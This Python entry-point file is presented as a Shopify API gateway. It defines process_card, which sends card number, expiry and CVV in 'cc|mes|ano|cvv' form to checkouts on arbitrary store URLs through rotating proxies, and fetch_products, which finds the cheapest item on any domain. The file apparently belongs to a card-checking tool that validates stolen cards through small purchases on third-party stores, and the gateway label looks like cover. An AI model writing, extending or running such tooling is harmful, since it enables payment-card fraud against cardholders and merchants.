"""
main.py - Modern Shopify High-Throughput API Gateway
Compatible with Railway, Docker, and legacy consumers.
"""
import os
import uvicorn
from typing import Optional, Tuple, Dict, Any

# Expose modern FastAPI ASGI Application
from app.main import app
from app.services.checkout_service import CheckoutService
from app.services.product_service import ProductService


# Backward Compatibility Bridge for legacy imports:
# from main import process_card, fetch_products
async def process_card(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    site_url: str,
    variant_id: Optional[str] = None,
    proxy_str: Optional[str] = None
) -> Tuple[bool, str, str, str, str]:
    """
    Legacy functional interface returning:
    (status: bool, response_code: str, gateway: str, price_str: str, currency: str)
    """
    cc_string = f"{cc}|{mes}|{ano}|{cvv}"
    result = await CheckoutService.process_card(
        cc_string=cc_string,
        site_url=site_url,
        variant_id=variant_id,
        proxy_override=proxy_str
    )
    return (
        result["Status"],
        result["Response"],
        result["Gateway"],
        str(result["Price"]),
        "USD"
    )


async def fetch_products(
    domain: str,
    proxy_str: Optional[str] = None
) -> Any:
    """Legacy functional interface returning lowest product dict or error tuple."""
    try:
        prod = await ProductService.get_lowest_product(domain, proxy_override=proxy_str)
        return {
            "site": prod["site"],
            "price": prod["price_str"],
            "variant_id": prod["variant_id"],
            "link": prod["link"]
        }
    except Exception as e:
        return False, f"error: {str(e)}"


if __name__ == "__main__":
    port = int(os.getenv("PORT", 8000))
    host = os.getenv("HOST", "0.0.0.0")
    workers = int(os.getenv("WORKERS", "4"))
    
    if os.name == "nt":
        # Windows development environment
        uvicorn.run("main:app", host=host, port=port, reload=False)
    else:
        # Linux Production deployment (Railway, VPS, Docker)
        uvicorn.run("main:app", host=host, port=port, workers=workers)
